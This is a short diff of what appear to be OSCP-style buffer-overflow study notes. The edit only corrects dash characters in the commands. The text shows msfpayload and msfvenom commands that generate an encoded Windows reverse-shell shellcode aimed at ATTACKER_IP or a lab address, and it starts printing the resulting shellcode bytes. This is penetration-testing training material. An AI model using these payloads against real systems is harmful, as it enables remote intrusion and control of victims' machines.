@@ -128,16 +128,16 @@ except:
 
 Injecting a shellcode
     First step, is to generate the shellcode. You can list all available payloads in metasploit:
-    *$ msfpayload –l*
+    *$ msfpayload -l*
     Generate a reverse shell shellcode.
     *$ msfpayload windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=443  -f c*
     The payload will contain illegal characters, you can filter those out using *msfencode*:
     *$ msfpayload windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=443 R | msfencode -b "\x00\x0a\x0d"*
     Generic windows reverse shell:
-    *$ msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f  c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
+    *$ msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f  c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
 
     In the end, you are going to have a shellcode as the following one:
-    *root@kali:~/oscp/bo_miniserver# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.4 LPORT=443 -f  c –e x86/shikata_ga_nai -b "\x00\x0d"
+    *root@kali:~/oscp/bo_miniserver# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.4 LPORT=443 -f  c -e x86/shikata_ga_nai -b "\x00\x0d"
 Final size of c file: 1500 bytes
 unsigned char buf[] =
 "\xbf\x09\x50\xa4\x04\xdb\xd3\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
